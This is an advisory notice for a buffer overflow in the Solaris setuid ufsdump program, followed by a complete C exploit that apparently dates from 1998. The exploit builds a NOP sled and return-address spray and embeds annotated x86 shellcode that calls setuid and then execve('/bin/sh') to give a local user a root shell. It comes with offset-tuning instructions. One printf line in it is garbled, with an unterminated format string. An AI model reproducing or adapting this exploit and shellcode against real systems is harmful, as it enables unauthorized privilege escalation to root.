source: http://www.securityfocus.com/bid/680/info
 
 
A buffer overflow vulnerability in the /usr/lib/fs/ufs/ufsdump setuid program allows local users to obtain root and tty group access. The vulnerability is the result of 'ufsdump' not being able to handle device names of a large length.

/**
***  ufodump - i386 Solaris root exploit for /usr/lib/fs/ufs/ufsdump
***
***  Tested and confirmed under Solaris 2.6 i386
***
***  Usage:  % ufodump [offset]
***
***  where offset (if present) is the number of bytes to add to the stack
***  pointer to calculate your target return address; try -1000 to 1000 in
***  increments of 100 for starters.  Thanks go to Seth McGann for the
***  original bug report and a preliminary exploit.
***
***  Cheez Whiz
***  cheezbeast@hotmail.com
***
***  December 30, 1998
**/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFLEN 1100
#define NOP 0x90

char shell[] =
/*  0 */ "\xeb\x48"                         /* jmp springboard       */
/* syscall:                                                          */
/*  2 */ "\x9a\xff\xff\xff\xff\x07\xff"     /* lcall 0x7,0x0         */
/*  9 */ "\xc3"                             /* ret                   */
/* start:                                                            */
/* 10 */ "\x5e"                             /* popl %esi             */
/* 11 */ "\x31\xc0"                         /* xor %eax,%eax         */
/* 13 */ "\x89\x46\xb4"                     /* movl %eax,-0x4c(%esi) */
/* 16 */ "\x88\x46\xb9"                     /* movb %al,-0x47(%esi)  */
/* 19 */ "\x88\x46\x07"                     /* movb %al,0x7(%esi)    */
/* 22 */ "\x89\x46\x0c"                     /* movl %eax,0xc(%esi)   */
/* seteuid:                                                          */
/* 25 */ "\x31\xc0"                         /* xor %eax,%eax         */
/* 27 */ "\x50"                             /* pushl %eax            */
/* 28 */ "\xb0\x8d"                         /* movb $0x8d,%al        */
/* 30 */ "\xe8\xdf\xff\xff\xff"             /* call syscall          */
/* 35 */ "\x83\xc4\x04"                     /* addl $0x4,%esp        */
/* setuid:                                                           */
/* 38 */ "\x31\xc0"                         /* xor %eax,%eax         */
/* 40 */ "\x50"                             /* pushl %eax            */
/* 41 */ "\xb0\x17"                         /* movb $0x17,%al        */
/* 43 */ "\xe8\xd2\xff\xff\xff"             /* call syscall          */
/* 48 */ "\x83\xc4\x04"                     /* addl $0x4,%esp        */
/* execve:                                                           */
/* 51 */ "\x31\xc0"                         /* xor %eax,%eax         */
/* 53 */ "\x50"                             /* pushl %eax            */
/* 54 */ "\x8d\x5e\x08"                     /* leal 0x8(%esi),%ebx   */
/* 57 */ "\x53"                             /* pushl %ebx            */
/* 58 */ "\x8d\x1e"                         /* leal (%esi),%ebx      */
/* 60 */ "\x89\x5e\x08"                     /* movl %ebx,0x8(%esi)   */
/* 63 */ "\x53"                             /* pushl %ebx            */
/* 64 */ "\xb0\x3b"                         /* movb $0x3b,%al        */
/* 66 */ "\xe8\xbb\xff\xff\xff"             /* call syscall          */
/* 71 */ "\x83\xc4\x0c"                     /* addl $0xc,%esp        */
/* springboard:                                                      */
/* 74 */ "\xe8\xbb\xff\xff\xff"             /* call start            */
/* data:                                                             */
/* 79 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA                  */
/* 87 */ "\xff\xff\xff\xff"                 /* DATA                  */
/* 91 */ "\xff\xff\xff\xff";                /* DATA                  */

char buf[BUFLEN];
unsigned long int nop, esp;
long int offset = 0;

unsigned long int
get_esp()
{
    __asm__("movl %esp,%eax");
}

void
main (int argc, char *argv[])
{
    int i;

    if (argc > 1)
        offset = strtol(argv[1], NULL, 0);

    if (argc > 2)
        nop = strtoul(argv[2], NULL, 0);
    else
        nop = 800;

    esp = get_esp();

    memset(buf, NOP, BUFLEN);
    memcpy(buf+nop, shell, strlen(shell));
    for (i = nop+strlen(shell); i < BUFLEN-4; i += 4)
        *((int *) &buf[i]) = esp+offset;

    printf("jumping to 0x%08x (0x%08x offset, nop);
    execl("/usr/lib/fs/ufs/ufsdump", "ufsdump", "1", buf, NULL);

    printf("exec failed!\n");
    return;
}